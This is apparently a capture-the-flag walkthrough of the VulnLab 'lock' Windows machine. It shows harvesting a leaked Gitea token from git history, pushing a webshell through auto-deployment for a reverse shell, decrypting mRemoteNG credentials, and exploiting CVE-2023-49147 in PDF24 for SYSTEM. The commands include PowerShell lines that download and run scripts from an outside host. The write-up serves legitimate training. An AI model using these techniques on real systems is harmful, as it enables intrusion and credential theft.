## Introduction
------------------------------------------------------------------------------------------
[lock](https://www.vulnlab.com/machines) is an easy-rated Windows box from VulnLab. To gain initial access, we clone a public Gitea repository whose first commit contains a leaked authorization token, giving us access to a private repository. That private repository has automatic deployment configured (essentially CI/CD), pushing content directly to port 80. By committing a `shell.aspx` webshell to the repository, we trigger a deployment and land a reverse shell by simply visiting it on port 80. For privilege escalation, we first decrypt an mRemoteNG configuration file to recover Gale.Dekarios's credentials, then exploit PDF24 (version 11.15.1) via CVE-2023-49147 to escalate to SYSTEM.

------------------------------------------------------------------------------------------

## Foothold
### Port 80
Port 80 hosts a standard IIS web application — nothing immediately interesting, but worth keeping in mind since this is where our deployed code will land.
![web app](../assets/img/ctf/vulnlab/lock/lock3.png)
### Port 3000
Port 3000 runs a Gitea instance. Gitea is a self-hosted Git service, and publicly exposed instances are always worth investigating for misconfigured or leaky repositories.
![gitea](../assets/img/ctf/vulnlab/lock/lock4.png)
![gitea](../assets/img/ctf/vulnlab/lock/lock5.png)

We can see a public repository owned by `ellen.freeman`. Let's clone it and inspect its history — developers often forget that sensitive data committed to git is preserved forever, even after deletion.
```bash
git clone http://lock.vl:3000/ellen.freeman/dev-scripts.git
```
![gitea](../assets/img/ctf/vulnlab/lock/lock6.png)

`git log` shows multiple commits. Checking out an earlier commit lets us see the state of the repository at that point in time — this is the standard approach for hunting secrets that were "deleted" but never truly removed from history.
```bash
git log
git checkout dcc869b175a47ff2a2b8171cda55cb82dbddff3d
```
![/etc/passwd](../assets/img/ctf/vulnlab/lock/lock7.png)
![/etc/passwd](../assets/img/ctf/vulnlab/lock/lock8.png)
![/etc/passwd](../assets/img/ctf/vulnlab/lock/lock9.png)

```python
import requests
import sys

# store this in env instead at some point
PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f'

def format_domain(domain):
    if not domain.startswith(('http://', 'https://')):
        domain = 'https://' + domain
    return domain

def get_repositories(token, domain):
    headers = {
        'Authorization': f'token {token}'
    }

    url = f'{domain}/api/v1/user/repos'
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        return response.json()
    else:
        raise Exception(f'Failed to retrieve repositories: {response.status_code}')
```

The first commit contains a hardcoded Gitea authorization token. With this token we can authenticate to the Gitea API and enumerate repositories that are not publicly visible, including private ones. Let's run the repos.py script for that:

```bash
python3 repos.py http://lock.vl:3000 
```
![all repos](../assets/img/ctf/vulnlab/lock/lock10.png)

The script reveals a private repository — `website` — that we couldn't see without authentication. We clone it by embedding the token directly in the URL, which is how Gitea accepts token-based authentication over HTTP.
```bash
git clone http://43ce39bb0bd6bc489284f2905f033ca467a6362f@lock.vl:3000/ellen.freeman/website.git
```
![internal repos](../assets/img/ctf/vulnlab/lock/lock11.png)

To confirm that this repository's contents are what gets served on port 80, we fuzz the web root and cross-reference the results with the files in the cloned repository.
```bash
ffuf -c -u http://lock.vl/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .txt
```
![web app fuzz](../assets/img/ctf/vulnlab/lock/lock12.png)

The file structure matches. This confirms that whatever we push to the repository will be automatically deployed and accessible on port 80 — a classic CI/CD misconfiguration. We add a simple ASPX webshell and push it.
```sh
git add .
git commit -m 'rev shell'
git push origin main
```
![web app fuzz](../assets/img/ctf/vulnlab/lock/lock13.png)

After the push, we trigger the shell by requesting the file and catching the connection with a listener.
```bash
curl http://lock.vl/shell.aspx
nc -lvnp 12345
```
![rev shell](../assets/img/ctf/vulnlab/lock/lock14.png)

We now have a shell as `ellen.freeman`. Looking around the filesystem, a `.gitconfig` file reveals credentials left behind by the developer.
![gitconfig](../assets/img/ctf/vulnlab/lock/lock15.png)

```
user: ellen:freeman
pass: fakepassword
```

Browsing to `ellen.freeman`'s Documents folder, we find an mRemoteNG configuration file. mRemoteNG is a remote connection manager that stores saved connection credentials — often encrypted with a weak default key.
```sh
type C:\Users\ellen.freeman\Documents\config.xml 
```
![mRemoteNG config](../assets/img/ctf/vulnlab/lock/lock16.png)

We copy the config file and decrypt it locally using a known mRemoteNG decryption script. Since mRemoteNG uses AES encryption with a default password (`mR3m`), this is trivial when the user hasn't set a custom master password.
```sh
python3 mremoteng_decrypt.py config.xml 
```
![mRemoteNG pass decrypted](../assets/img/ctf/vulnlab/lock/lock17.png)

The decrypted config reveals credentials for `Gale.Dekarios`. We use them to open a full RDP session.
```
user: Gale.Dekarios
pass: fakepassword
```
```sh
xfreerdp /u:'Gale.Dekarios' /p:'fakepassword' /v:lock
```
![rdp](../assets/img/ctf/vulnlab/lock/lock19.png)

## Privilege Escalation
With a desktop session as `Gale.Dekarios`, we run standard privilege escalation enumeration tools to identify attack surface.
```powershell
powershell -ep bypass
iex (iwr http://10.8.4.67/PowerUp.ps1 -UseBasicParsing)
iex ((New-Object Net.WebClient).DownloadString('http://10.8.4.67/PrivescCheck.ps1'))
Invoke-AllChecks
Invoke-PrivescCheck

curl -o procexp64.exe http://10.8.4.67/procexp64.exe
```
![procexp64](../assets/img/ctf/vulnlab/lock/lock20.png)

Process Explorer reveals that PDF24 is installed. Checking its version shows it falls within the vulnerable range for CVE-2023-49147, a local privilege escalation that abuses the MSI repair process.
```
Vulnerable: <=11.15.1
Fixed: 11.15.2
```
![msi](../assets/img/ctf/vulnlab/lock/lock21.png)

The vulnerability works as follows: the MSI repair operation runs as SYSTEM and writes to a log file at a predictable path. By using `SetOpLock` to place an opportunistic lock on that log file, we can pause the installer mid-execution — at a point where a SYSTEM-level GUI is still open and interactive. We trigger the repair either via `msiexec /fa` or by right-clicking the MSI and selecting "Repair".
```powershell
msiexec.exe /fa "C:\_install\pdf24-creator-11.15.1-x64.msi"
or 
Manually right click on the msi file then repair...

SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r
```
![repair](../assets/img/ctf/vulnlab/lock/lock22.png)

With the installer paused and running as SYSTEM, we interact with its GUI to open a file dialog and navigate to `cmd.exe`. Right-clicking and selecting "Legacy console mode" (or opening an Explorer/Edge window and typing the path) gives us a SYSTEM shell.
```text
Right click -> Legacyconsolemode -> Edge/Explorer -> cmd.exe
```
![explorer as system](../assets/img/ctf/vulnlab/lock/lock23.png)

![cmd as system](../assets/img/ctf/vulnlab/lock/lock24.png)

## Kill Chain Summary
1. Clone the publicly available repository from Gitea, revert to the first commit, and discover a leaked Gitea authorization token.
2. Use the token to enumerate all repositories on the instance and clone the private `website` repository.
3. The repository is the source for the app running on port 80 — abuse the CI/CD pipeline to push a webshell and get a reverse shell as `ellen.freeman`.
4. Read the mRemoteNG config file from `ellen.freeman`'s Documents folder and decrypt it to recover `Gale.Dekarios`'s credentials.
5. Exploit CVE-2023-49147 in PDF24 (version 11.15.1) via the MSI repair mechanism to obtain a SYSTEM shell.
